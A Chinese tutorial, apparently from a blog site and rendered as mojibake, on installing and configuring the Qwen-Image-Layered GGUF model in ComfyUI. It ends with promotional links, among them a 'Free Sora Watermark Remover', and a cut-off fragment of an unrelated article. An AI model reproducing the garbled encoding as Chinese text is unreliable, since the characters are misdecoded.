<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯Qwen-Image-Layered?</h2>
<p>Qwen-Image-Layeredæ˜¯ä¸€ä¸ªå…ˆè¿›çš„å›¾åƒåˆ†è§£æ¨¡å‹,èƒ½å¤Ÿå°†å¹³é¢å…‰æ …å›¾åƒè½¬æ¢ä¸ºç»“æ„åŒ–çš„å¤šå±‚è¡¨ç¤ºã€‚ä¸ä¼ ç»Ÿçš„å›¾åƒåˆ†å‰²åªæä¾›è’™ç‰ˆä¸åŒ,è¿™ä¸ªæ¨¡å‹ä¸ºæ¯ä¸ªå›¾å±‚ç”Ÿæˆå®Œæ•´çš„RGBAå›¾åƒ,åŒ…æ‹¬:</p>
<ul>
<li><strong>èƒŒæ™¯å›¾å±‚</strong>,å®Œæ•´çš„åœºæ™¯é‡å»º</li>
<li><strong>å‰æ™¯å¯¹è±¡</strong>,å¸¦æœ‰é€‚å½“çš„Alphaé€šé“</li>
<li><strong>æ–‡æœ¬å…ƒç´ </strong>,éš”ç¦»ä»¥ä¾¿è½»æ¾ç¼–è¾‘</li>
<li><strong>è£…é¥°æ•ˆæœ</strong>å’ŒåŠé€æ˜å…ƒç´ </li>
<li><strong>è¢«é®æŒ¡åŒºåŸŸ</strong>,æ™ºèƒ½é‡å»º</li>
</ul>
<p>è¯¥æ¨¡å‹æ”¯æŒå¯å˜çš„å›¾å±‚æ•°é‡(3ã€4ã€8å±‚æˆ–æ›´å¤š),ç”šè‡³æ”¯æŒé€’å½’åˆ†è§£,ä»»ä½•å›¾å±‚éƒ½å¯ä»¥è¿›ä¸€æ­¥åˆ†è§£ä¸ºå­å›¾å±‚ã€‚è¿™ç§çµæ´»æ€§ä½¿å…¶é€‚ç”¨äºä»ç®€å•çš„äº§å“ç…§ç‰‡åˆ°å¤æ‚çš„è‰ºæœ¯ä½œå“çš„å„ç§åœºæ™¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81b3d1aec6a846f4bf16332613d4661a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqq5Yqb54qv6ZSZ546pQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874759&amp;x-signature=o5oFmWlSmTgCnBYPrM1LZYUPnO8%3D" alt="1" loading="lazy"/></p>
<h2 data-id="heading-1">ä¸ºä»€ä¹ˆé€‰æ‹©GGUFæ ¼å¼?</h2>
<p>GGUFæ ¼å¼ç»“åˆé‡åŒ–æŠ€æœ¯ä¸ºComfyUIç”¨æˆ·æä¾›äº†æ˜¾è‘—ä¼˜åŠ¿,ç‰¹åˆ«æ˜¯å¯¹äºç¡¬ä»¶èµ„æºæœ‰é™çš„ç”¨æˆ·ã€‚</p>
<h3 data-id="heading-2">GGUFé‡åŒ–çš„æ ¸å¿ƒä¼˜åŠ¿</h3>
<p><strong>1. å¤§å¹…é™ä½æ˜¾å­˜éœ€æ±‚</strong></p>
<p>é‡åŒ–é€šè¿‡é™ä½æ•°å€¼æƒé‡çš„ç²¾åº¦,å°†æ¨¡å‹å¤§å°ç¼©å°50-75%ã€‚é€šå¸¸éœ€è¦16GB+æ˜¾å­˜çš„æ¨¡å‹,ä½¿ç”¨GGUFé‡åŒ–åå¯ä»¥åœ¨8GBç”šè‡³æ›´å°‘æ˜¾å­˜çš„GPUä¸Šè¿è¡Œã€‚</p>
<p><strong>2. æ›´å¿«çš„æ¨ç†é€Ÿåº¦</strong></p>
<p>è¾ƒä½ç²¾åº¦çš„æƒé‡æ„å‘³ç€æ›´å¿«çš„è®¡ç®—ã€‚GGUFä¼˜åŒ–çš„äºŒè¿›åˆ¶æ ¼å¼è¿˜æ”¯æŒå¿«é€ŸåŠ è½½å’Œä¿å­˜,å‡å°‘å¯åŠ¨æ—¶é—´ã€‚</p>
<p><strong>3. ç»æµå®æƒ çš„AIç”Ÿæˆ</strong></p>
<p>é€šè¿‡é™ä½ç¡¬ä»¶è¦æ±‚,GGUFé‡åŒ–æ¶ˆé™¤äº†å¯¹æ˜‚è´µé«˜ç«¯GPUçš„éœ€æ±‚ã€‚ä½ å¯ä»¥åœ¨æ¶ˆè´¹çº§ç¡¬ä»¶ä¸Šè¿è¡Œå¼ºå¤§çš„å›¾åƒç¼–è¾‘æ¨¡å‹ã€‚</p>
<p><strong>4. çµæ´»çš„é‡åŒ–çº§åˆ«</strong></p>
<p>GGUFæ”¯æŒå¤šç§é‡åŒ–çº§åˆ«(Q2ã€Q4ã€Q5ã€Q6ã€Q8),è®©ä½ å¯ä»¥åœ¨æ¨¡å‹å¤§å°ã€é€Ÿåº¦å’Œè¾“å‡ºè´¨é‡ä¹‹é—´å–å¾—å¹³è¡¡ã€‚Q4_K_Mçº§åˆ«é€šå¸¸è¢«æ¨èã€‚</p>
<p><strong>5. æ— ç¼çš„ComfyUIé›†æˆ</strong></p>
<p>ComfyUI-GGUFç­‰è‡ªå®šä¹‰èŠ‚ç‚¹æä¾›äº†ç›´æ¥å°†GGUFæ¨¡å‹åŠ è½½åˆ°å·¥ä½œæµçš„åŸç”Ÿæ”¯æŒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f709b473a59f4abd8f0d84020dce03ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqq5Yqb54qv6ZSZ546pQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874759&amp;x-signature=J7PBoif7z%2Fyw0OUV5KIUw426Z%2BE%3D" alt="1" loading="lazy"/></p>
<h2 data-id="heading-3">ç³»ç»Ÿè¦æ±‚å’Œå‡†å¤‡å·¥ä½œ</h2>
<p>åœ¨ComfyUIä¸­å®‰è£…Qwen-Image-Layered GGUFä¹‹å‰,ç¡®ä¿ä½ çš„ç³»ç»Ÿæ»¡è¶³ä»¥ä¸‹è¦æ±‚:</p>
<h3 data-id="heading-4">æœ€ä½ç¡¬ä»¶è¦æ±‚</h3>
<ul>
<li><strong>GPU</strong>: 8GBæ˜¾å­˜(GGUF Q4ç‰ˆæœ¬)æˆ–12GB+æ˜¾å­˜(FP8/BF16ç‰ˆæœ¬)</li>
<li><strong>å†…å­˜</strong>: æ¨è16GBç³»ç»Ÿå†…å­˜</li>
<li><strong>å­˜å‚¨</strong>: 15-20GBå¯ç”¨ç©ºé—´ç”¨äºæ¨¡å‹æ–‡ä»¶</li>
<li><strong>æ“ä½œç³»ç»Ÿ</strong>: Windows 10/11ã€Linuxæˆ–macOS</li>
</ul>
<h3 data-id="heading-5">è½¯ä»¶å‰ææ¡ä»¶</h3>
<ul>
<li><strong>ComfyUI</strong>: æœ€æ–°ç‰ˆæœ¬(æ›´æ–°ä»¥æ”¯æŒåŸç”ŸQwen-Image-LayeredèŠ‚ç‚¹)</li>
<li><strong>Python</strong>: 3.10æˆ–æ›´æ–°ç‰ˆæœ¬</li>
<li><strong>CUDA</strong>: 11.8æˆ–æ›´æ–°ç‰ˆæœ¬(é€‚ç”¨äºNVIDIA GPU)</li>
</ul>
<h3 data-id="heading-6">æ€§èƒ½é¢„æœŸ</h3>
<p>åŸºäºå®é™…æµ‹è¯•:</p>
<ul>
<li><strong>RTX 4090</strong>: BF16ç‰ˆæœ¬å‡ ä¹å®Œå…¨å ç”¨æ˜¾å­˜</li>
<li><strong>RTX 3060 (12GB)</strong>: GGUF Q4ç‰ˆæœ¬è¿è¡Œèˆ’é€‚</li>
<li><strong>RTX 3050 (8GB)</strong>: åœ¨640pxåˆ†è¾¨ç‡ä¸‹å¯ä½¿ç”¨GGUF Q4</li>
<li><strong>ç”Ÿæˆæ—¶é—´</strong>: 640pxçº¦60-120ç§’,1024pxçº¦120-180ç§’(50æ¨ç†æ­¥æ•°)</li>
</ul>
<h2 data-id="heading-7">åˆ†æ­¥å®‰è£…æŒ‡å—</h2>
<p>æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤åœ¨ComfyUIä¸­å®‰è£…Qwen-Image-Layered GGUF:</p>
<h3 data-id="heading-8">æ­¥éª¤1: æ›´æ–°ComfyUI</h3>
<p>é¦–å…ˆ,ç¡®ä¿ä½ è¿è¡Œçš„æ˜¯æœ€æ–°ç‰ˆæœ¬çš„ComfyUI:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> ComfyUI
git pull
</code></pre>
<p>æœ€æ–°ç‰ˆæœ¬çš„ComfyUIåŒ…å«å¯¹Qwen-Image-Layeredçš„åŸç”Ÿæ”¯æŒã€‚</p>
<h3 data-id="heading-9">æ­¥éª¤2: ä¸‹è½½å¿…éœ€çš„æ¨¡å‹æ–‡ä»¶</h3>
<p>ä½ éœ€è¦ä¸‰ä¸ªæ ¸å¿ƒæ¨¡å‹æ–‡ä»¶ã€‚ä»Hugging Faceæˆ–ModelScopeä¸‹è½½:</p>
<p><strong>å¿…éœ€æ–‡ä»¶:</strong></p>
<ol>
<li><strong>æ–‡æœ¬ç¼–ç å™¨</strong>: <code>qwen_2.5_vl_7b_fp8_scaled.safetensors</code> (~4.5GB)</li>
<li><strong>æ‰©æ•£æ¨¡å‹</strong>(é€‰æ‹©ä¸€ä¸ª):
<ul>
<li>GGUF Q4: <code>qwen_image_layered_Q4_K_M.gguf</code> (~3.2GB) - æ¨èç”¨äº8-12GBæ˜¾å­˜</li>
<li>FP8: <code>qwen_image_layered_fp8mixed.safetensors</code> (~6.8GB) - é€‚ç”¨äº12-16GBæ˜¾å­˜</li>
<li>BF16: <code>qwen_image_layered_bf16.safetensors</code> (~13GB) - é€‚ç”¨äº16GB+æ˜¾å­˜</li>
</ul>
</li>
<li><strong>VAE</strong>: <code>qwen_image_layered_vae.safetensors</code> (~320MB)</li>
</ol>
<p><strong>ä¸‹è½½æ¥æº:</strong></p>
<ul>
<li>Hugging Face: <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2FQwen%2FQwen-Image-Layered" target="_blank" title="https://huggingface.co/Qwen/Qwen-Image-Layered" ref="nofollow noopener noreferrer">Qwen/Qwen-Image-Layered</a></li>
<li>GGUFç‰ˆæœ¬: <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2FQuantStack%2FQwen-Image-Layered-GGUF" target="_blank" title="https://huggingface.co/QuantStack/Qwen-Image-Layered-GGUF" ref="nofollow noopener noreferrer">QuantStack/Qwen-Image-Layered-GGUF</a></li>
</ul>
<h3 data-id="heading-10">æ­¥éª¤3: å°†æ–‡ä»¶æ”¾ç½®åœ¨æ­£ç¡®çš„ç›®å½•</h3>
<p>åœ¨ComfyUIå®‰è£…ç›®å½•ä¸­ç»„ç»‡ä¸‹è½½çš„æ–‡ä»¶:</p>
<pre><code class="hljs language-bash" lang="bash">ComfyUI/models/
â”œâ”€â”€ text_encoders/
â”‚   â””â”€â”€ qwen_2.5_vl_7b_fp8_scaled.safetensors
â”œâ”€â”€ diffusion_models/
â”‚   â””â”€â”€ qwen_image_layered_Q4_K_M.gguf
â””â”€â”€ vae/
    â””â”€â”€ qwen_image_layered_vae.safetensors
</code></pre>
<p><strong>é‡è¦æç¤º</strong>: VAEæ–‡ä»¶ä¸“ä¸ºQwen-Image-Layeredè®¾è®¡,å¤„ç†å››ä¸ªé€šé“(RGBA)è€Œä¸æ˜¯æ ‡å‡†çš„ä¸‰ä¸ªé€šé“(RGB)ã€‚</p>
<h3 data-id="heading-11">æ­¥éª¤4: å®‰è£…GGUFæ”¯æŒ(å¦‚éœ€è¦)</h3>
<p>å¦‚æœä½¿ç”¨GGUFç‰ˆæœ¬ä¸”ComfyUIæ²¡æœ‰å†…ç½®GGUFæ”¯æŒ,å®‰è£…ComfyUI-GGUFè‡ªå®šä¹‰èŠ‚ç‚¹:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> ComfyUI/custom_nodes
git <span class="hljs-built_in">clone</span> https://github.com/city96/ComfyUI-GGUF
<span class="hljs-built_in">cd</span> ComfyUI-GGUF
pip install -r requirements.txt
</code></pre>
<p>å®‰è£…åé‡å¯ComfyUIã€‚</p>
<h2 data-id="heading-12">é…ç½®ComfyUIå·¥ä½œæµ</h2>
<p>æ¨¡å‹å®‰è£…å®Œæˆå,ä½ å¯ä»¥åœ¨ComfyUIä¸­è®¾ç½®Qwen-Image-Layeredå·¥ä½œæµã€‚</p>
<h3 data-id="heading-13">åŸºç¡€å·¥ä½œæµç»“æ„</h3>
<p>å…¸å‹çš„Qwen-Image-Layeredå·¥ä½œæµåŒ…å«ä»¥ä¸‹å…³é”®èŠ‚ç‚¹:</p>
<ol>
<li><strong>Load Image</strong>: è¾“å…¥æºå›¾åƒ</li>
<li><strong>GGUF Unet Loader</strong>: åŠ è½½Qwen-Image-Layeredæ¨¡å‹</li>
<li><strong>GGUF CLIP Loader</strong>: åŠ è½½æ–‡æœ¬ç¼–ç å™¨</li>
<li><strong>Load VAE</strong>: åŠ è½½ä¸“ç”¨çš„Qwen VAE</li>
<li><strong>Sampler</strong>: é…ç½®ç”Ÿæˆå‚æ•°</li>
<li><strong>Save Image</strong>: è¾“å‡ºç”Ÿæˆçš„å›¾å±‚</li>
</ol>
<h3 data-id="heading-14">æ¨èçš„é‡‡æ ·å™¨è®¾ç½®</h3>
<p>ä¸ºäº†è·å¾—æœ€ä½³æ•ˆæœ:</p>
<ul>
<li><strong>æ¨ç†æ­¥æ•°</strong>: 50(æ¨èæœ€å°å€¼)</li>
<li><strong>CFGæ¯”ä¾‹</strong>: 4.0</li>
<li><strong>é‡‡æ ·å™¨</strong>: Euleræˆ–DPM++ 2M</li>
<li><strong>è°ƒåº¦å™¨</strong>: Normalæˆ–Karras</li>
</ul>
<h3 data-id="heading-15">åˆ†è¾¨ç‡è®¾ç½®</h3>
<p>æ ¹æ®ç¡¬ä»¶å’Œè´¨é‡éœ€æ±‚é€‰æ‹©:</p>
<ul>
<li><strong>640px</strong>: å¹³è¡¡è´¨é‡å’Œé€Ÿåº¦,é€‚ç”¨äº8GBæ˜¾å­˜</li>
<li><strong>768px</strong>: æ›´é«˜è´¨é‡,éœ€è¦10GB+æ˜¾å­˜</li>
<li><strong>1024px</strong>: æœ€é«˜è´¨é‡,GGUFéœ€è¦12GB+æ˜¾å­˜</li>
</ul>
<h2 data-id="heading-16">å®é™…åº”ç”¨æ¡ˆä¾‹</h2>
<h3 data-id="heading-17">1. ç”µå•†äº§å“ç¼–è¾‘</h3>
<p><strong>åœºæ™¯</strong>: äº§å“ç…§ç‰‡éœ€è¦é¢œè‰²å˜ä½“æˆ–èƒŒæ™¯æ›´æ¢ã€‚</p>
<p><strong>å·¥ä½œæµç¨‹</strong>:</p>
<ul>
<li>å°†äº§å“å›¾åƒåˆ†è§£ä¸ºå›¾å±‚</li>
<li>ä»èƒŒæ™¯ä¸­éš”ç¦»äº§å“å›¾å±‚</li>
<li>ä¸ºä¸åŒå˜ä½“é‡æ–°ç€è‰²äº§å“å›¾å±‚</li>
<li>ç”¨æ–°åœºæ™¯æ›¿æ¢èƒŒæ™¯å›¾å±‚</li>
</ul>
<p><strong>ä¼˜åŠ¿</strong>: åœ¨å‡ åˆ†é’Ÿå†…åˆ›å»ºå¤šä¸ªäº§å“å˜ä½“ã€‚</p>
<h3 data-id="heading-18">2. è¥é”€å’Œå¹¿å‘Šåˆ›ä½œ</h3>
<p><strong>åœºæ™¯</strong>: ç”¨æ–°æ–‡æœ¬æˆ–å­£èŠ‚æ€§å…ƒç´ æ›´æ–°ä¿ƒé”€ææ–™ã€‚</p>
<p><strong>å·¥ä½œæµç¨‹</strong>:</p>
<ul>
<li>åŠ è½½ç°æœ‰å¹¿å‘Šå›¾åƒ</li>
<li>åˆ†è§£ä¸ºå›¾å±‚(èƒŒæ™¯ã€äº§å“ã€æ–‡å­—ã€è£…é¥°)</li>
<li>ç”¨æ›´æ–°çš„æ–‡æ¡ˆæ›¿æ¢æ–‡å­—å›¾å±‚</li>
<li>ä¸ºå­£èŠ‚æ€§ä¸»é¢˜äº¤æ¢è£…é¥°å…ƒç´ </li>
</ul>
<p><strong>ä¼˜åŠ¿</strong>: å¿«é€Ÿè¿­ä»£è¥é”€ææ–™ã€‚</p>
<h2 data-id="heading-19">ä¼˜åŒ–æŠ€å·§å’Œæ•…éšœæ’é™¤</h2>
<h3 data-id="heading-20">æ€§èƒ½ä¼˜åŒ–</h3>
<p><strong>1. é€‰æ‹©åˆé€‚çš„é‡åŒ–çº§åˆ«</strong></p>
<ul>
<li><strong>Q4_K_M</strong>: å¤§å¤šæ•°ç”¨æˆ·çš„æœ€ä½³å¹³è¡¡(èŠ‚çœ3-4GBæ˜¾å­˜)</li>
<li><strong>Q5_K_M</strong>: è´¨é‡ç¨å¥½,ä¸­ç­‰æ˜¾å­˜èŠ‚çœ</li>
<li><strong>Q6_K</strong>: æ¥è¿‘åŸå§‹è´¨é‡,æœ€å°æ˜¾å­˜èŠ‚çœ</li>
</ul>
<p><strong>2. æ ¹æ®ç¡¬ä»¶è°ƒæ•´åˆ†è¾¨ç‡</strong></p>
<p>ä»640pxå¼€å§‹,åªæœ‰åœ¨ç¡¬ä»¶èƒ½å¤Ÿå¤„ç†æ—¶æ‰å¢åŠ ã€‚</p>
<p><strong>3. å¯ç”¨å†…å­˜ä¼˜åŒ–</strong></p>
<p>åœ¨ComfyUIè®¾ç½®ä¸­å¯ç”¨:</p>
<ul>
<li>"è‡ªåŠ¨å¸è½½æ¨¡å‹"</li>
<li>"æ˜¾å­˜ç®¡ç†: è‡ªåŠ¨"</li>
<li>"æ¿€è¿›çš„å†…å­˜æ¸…ç†"</li>
</ul>
<h3 data-id="heading-21">å¸¸è§é—®é¢˜å’Œè§£å†³æ–¹æ¡ˆ</h3>
<p><strong>é—®é¢˜1: "å†…å­˜ä¸è¶³"é”™è¯¯</strong></p>
<p>è§£å†³æ–¹æ¡ˆ:</p>
<ul>
<li>åˆ‡æ¢åˆ°è¾ƒä½é‡åŒ–(Q4è€Œä¸æ˜¯Q5/Q6)</li>
<li>é™ä½è¾“å…¥åˆ†è¾¨ç‡(640pxè€Œä¸æ˜¯1024px)</li>
<li>å…³é—­å…¶ä»–GPUå¯†é›†å‹åº”ç”¨ç¨‹åº</li>
</ul>
<p><strong>é—®é¢˜2: å›¾å±‚åˆ†ç¦»è´¨é‡å·®</strong></p>
<p>è§£å†³æ–¹æ¡ˆ:</p>
<ul>
<li>å°†æ¨ç†æ­¥æ•°å¢åŠ åˆ°60-70</li>
<li>è°ƒæ•´CFGæ¯”ä¾‹(å°è¯•3.5-4.5èŒƒå›´)</li>
<li>æä¾›å…³äºå›¾åƒå†…å®¹çš„æè¿°æ€§æç¤ºè¯</li>
<li>ç¡®ä¿ä½¿ç”¨æ­£ç¡®çš„Qwen VAE</li>
</ul>
<h2 data-id="heading-22">ä¸ºä»€ä¹ˆä½¿ç”¨ComfyUIè€Œä¸æ˜¯åœ¨çº¿å·¥å…·?</h2>
<p>è™½ç„¶å­˜åœ¨åœ¨çº¿AIå›¾åƒç¼–è¾‘å™¨,ä½†åœ¨ComfyUIä¸­æœ¬åœ°è¿è¡ŒQwen-Image-Layered GGUFæä¾›äº†æ˜æ˜¾çš„ä¼˜åŠ¿:</p>
<h3 data-id="heading-23">éšç§å’Œæˆæœ¬æ•ˆç›Š</h3>
<p><strong>æœ¬åœ°å¤„ç†</strong>:</p>
<ul>
<li>ä½ çš„å›¾åƒæ°¸è¿œä¸ä¼šç¦»å¼€ä½ çš„è®¡ç®—æœº</li>
<li>æ²¡æœ‰æ•°æ®ä¸Šä¼ åˆ°ç¬¬ä¸‰æ–¹æœåŠ¡å™¨</li>
<li>å…è´¹ã€å¼€æºè½¯ä»¶</li>
<li>æ— é™ç”Ÿæˆ,æ— è®¢é˜…è´¹ç”¨</li>
</ul>
<p><strong>åœ¨çº¿å·¥å…·</strong>:</p>
<ul>
<li>å›¾åƒä¸Šä¼ åˆ°å¤–éƒ¨æœåŠ¡å™¨</li>
<li>æ¯æœˆè®¢é˜…è´¹ç”¨</li>
<li>åŸºäºç§¯åˆ†çš„ç³»ç»Ÿ</li>
</ul>
<h3 data-id="heading-24">å®šåˆ¶å’Œæ§åˆ¶</h3>
<p>ComfyUIæä¾›å®Œå…¨çš„å·¥ä½œæµå®šåˆ¶ã€å‚æ•°æ§åˆ¶å’Œç»“åˆå¤šä¸ªæ¨¡å‹çš„èƒ½åŠ›ã€‚ä¸è¿‡,å¦‚æœä½ æƒ³åœ¨ä¸å®‰è£…çš„æƒ…å†µä¸‹å¿«é€Ÿæµ‹è¯•Qwen-Image-LayeredåŠŸèƒ½,åƒ <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fzimage.run" target="_blank" title="https://zimage.run" ref="nofollow noopener noreferrer">ZImage.run</a></strong> è¿™æ ·çš„å¹³å°æä¾›äº†æ–¹ä¾¿çš„åœ¨çº¿è®¿é—®å„ç§AIå›¾åƒç”Ÿæˆæ¨¡å‹ã€‚</p>
<p>è¿™å¯¹ä»¥ä¸‹æƒ…å†µå¾ˆæœ‰ç”¨:</p>
<ul>
<li>åœ¨æ‰¿è¯ºæœ¬åœ°è®¾ç½®ä¹‹å‰å¿«é€Ÿå®éªŒ</li>
<li>æ¯”è¾ƒä¸åŒçš„æ¨¡å‹å’Œå‚æ•°</li>
<li>åœ¨æ²¡æœ‰GPUçš„è®¾å¤‡ä¸Šç”Ÿæˆæ ·æœ¬</li>
</ul>
<p>ä¸€æ—¦éªŒè¯äº†å·¥ä½œæµ,è¿‡æ¸¡åˆ°æœ¬åœ°ComfyUIå¯ä»¥æä¾›æœ€å¤§çš„çµæ´»æ€§å’Œæ§åˆ¶ã€‚</p>
<h2 data-id="heading-25">ç»“è®º</h2>
<p>ComfyUIä¸­çš„Qwen-Image-Layered GGUFä»£è¡¨äº†å¯è®¿é—®çš„AIé©±åŠ¨å›¾åƒç¼–è¾‘çš„é‡å¤§è¿›æ­¥ã€‚é€šè¿‡è‡ªåŠ¨å°†å›¾åƒåˆ†è§£ä¸ºå¯ç¼–è¾‘å›¾å±‚,å®ƒæ¶ˆé™¤äº†æ•°å°æ—¶çš„æ‰‹åŠ¨è’™ç‰ˆå·¥ä½œ,åŒæ—¶ä¿æŒä¸“ä¸šçº§è´¨é‡çš„ç»“æœã€‚</p>
<h3 data-id="heading-26">å…³é”®è¦ç‚¹</h3>
<ul>
<li><strong>GGUFé‡åŒ–</strong>åœ¨ä¸æ˜¾è‘—é™ä½è´¨é‡çš„æƒ…å†µä¸‹å°†æ˜¾å­˜éœ€æ±‚å‡å°‘50-75%</li>
<li><strong>Q4_K_Mé‡åŒ–</strong>ä¸ºå¤§å¤šæ•°æ‹¥æœ‰8-12GBæ˜¾å­˜çš„ç”¨æˆ·æä¾›æœ€ä½³å¹³è¡¡</li>
<li><strong>åŸç”ŸComfyUIæ”¯æŒ</strong>ç®€åŒ–äº†å®‰è£…å’Œå·¥ä½œæµåˆ›å»º</li>
<li><strong>å¯å˜å›¾å±‚æ•°é‡</strong>å’Œé€’å½’åˆ†è§£æä¾›æœ€å¤§çµæ´»æ€§</li>
<li><strong>æœ¬åœ°å¤„ç†</strong>ç¡®ä¿éšç§ã€æˆæœ¬æ•ˆç›Šå’Œæ— é™ä½¿ç”¨</li>
</ul>
<h3 data-id="heading-27">ä»Šå¤©å¼€å§‹</h3>
<ol>
<li>å°†ComfyUIæ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬</li>
<li>ä¸‹è½½Qwen-Image-Layered GGUFæ¨¡å‹(æ¨èQ4_K_M)</li>
<li>å°†æ–‡ä»¶æ”¾ç½®åœ¨æ­£ç¡®çš„ComfyUIç›®å½•ä¸­</li>
<li>åŠ è½½ç¤ºä¾‹å·¥ä½œæµæˆ–åˆ›å»ºè‡ªå·±çš„å·¥ä½œæµ</li>
<li>ä»640pxåˆ†è¾¨ç‡å’Œ50æ¨ç†æ­¥æ•°å¼€å§‹</li>
<li>å°è¯•ä¸åŒçš„å›¾åƒå’Œå›¾å±‚æ•°é‡</li>
</ol>
<h3 data-id="heading-28">å…¶ä»–èµ„æº</h3>
<p><strong>å®˜æ–¹æ–‡æ¡£</strong>:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2FQwen%2FQwen-Image-Layered" target="_blank" title="https://huggingface.co/Qwen/Qwen-Image-Layered" ref="nofollow noopener noreferrer">Hugging Faceä¸Šçš„Qwen-Image-Layered</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2512.15603" target="_blank" title="https://arxiv.org/abs/2512.15603" ref="nofollow noopener noreferrer">arXivä¸Šçš„ç ”ç©¶è®ºæ–‡</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.comfy.org" target="_blank" title="https://docs.comfy.org" ref="nofollow noopener noreferrer">ComfyUIå®˜æ–¹æ–‡æ¡£</a></li>
</ul>
<p><strong>ç¤¾åŒºèµ„æº</strong>:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcomfyui-wiki.com%2Fen%2Ftutorial%2Fadvanced%2Fimage%2Fqwen%2Fqwen-image-layered" target="_blank" title="https://comfyui-wiki.com/en/tutorial/advanced/image/qwen/qwen-image-layered" ref="nofollow noopener noreferrer">ComfyUI Wikiæ•™ç¨‹</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcity96%2FComfyUI-GGUF" target="_blank" title="https://github.com/city96/ComfyUI-GGUF" ref="nofollow noopener noreferrer">ComfyUI-GGUF GitHubä»“åº“</a></li>
</ul>
<p>ä»Šå¤©å°±å¼€å§‹åœ¨ComfyUIä¸­å°è¯•Qwen-Image-Layered GGUF,å‘ç°åŸºäºå›¾å±‚çš„AIç¼–è¾‘å¦‚ä½•æ”¹å˜ä½ çš„åˆ›æ„å·¥ä½œæµã€‚</p>
<hr/>
<p><strong>å‡†å¤‡å°è¯•AIå›¾åƒç”Ÿæˆ?</strong> è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fzimage.run" target="_blank" title="https://zimage.run" ref="nofollow noopener noreferrer">zimage.run</a> æ¢ç´¢å„ç§AIæ¨¡å‹å’Œå·¥ä½œæµ,æˆ–è®¾ç½®æœ¬åœ°ComfyUIå®‰è£…ä»¥è·å¾—æ— é™åˆ›æ„å¯èƒ½æ€§ã€‚</p>
<h2 data-id="heading-29">Link</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fchatgpt.com%2Fshare%2F695cef87-0908-8008-8a2e-b9a6f7aaf8d8" target="_blank" title="https://chatgpt.com/share/695cef87-0908-8008-8a2e-b9a6f7aaf8d8" ref="nofollow noopener noreferrer">Z-Image: Free AI Image Generator</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffelo.ai%2Fsearch%2FhoAAzHBhhvvrBVT4mhyAme" target="_blank" title="https://felo.ai/search/hoAAzHBhhvvrBVT4mhyAme" ref="nofollow noopener noreferrer">Z-Image-Turbo: Free AI Image Generator</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffelo.ai%2Fsearch%2Faj2VYq7z58aHRfVaGibUPG" target="_blank" title="https://felo.ai/search/aj2VYq7z58aHRfVaGibUPG" ref="nofollow noopener noreferrer">Free Sora Watermark Remover</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsites.google.com%2Fview%2Fzimagerun" target="_blank" title="https://sites.google.com/view/zimagerun" ref="nofollow noopener noreferrer">Zimage.run Google Site</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fzimage.run%2F" target="_blank" title="https://link.zhihu.com/?target=https%3A//zimage.run/" ref="nofollow noopener noreferrer">Zhi Hu</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fltx-2.run%2F" target="_blank" title="https://ltx-2.run/" ref="nofollow noopener noreferrer">LTX-2</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Flnk.bio%2Fgary02" target="_blank" title="https://lnk.bio/gary02" ref="nofollow noopener noreferrer">LNK</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[langchainå­¦ä¹ æ€»ç»“-Runnableç»„ä»¶ bind å‡½æ•°]]></title>    <link>https://juejin.cn/post/7594389937462771722</link>    <guid>https://juejin.cn/post/7594389937462771722</guid>    <pubDate>2026-01-13T02:14:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389937462771722" data-draft-id="7594383365418319918" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="langchainå­¦ä¹ æ€»ç»“-Runnableç»„ä»¶ bind å‡½æ•°"/> <meta itemprop="keywords" content="å…¨æ ˆ"/> <meta itemprop="datePublished" content="2026-01-13T02:14:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¿ƒåœ¨é£æ‰¬AI"/> <meta itemprop="url" content="https://juejin.cn/user/1556564194366823"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" 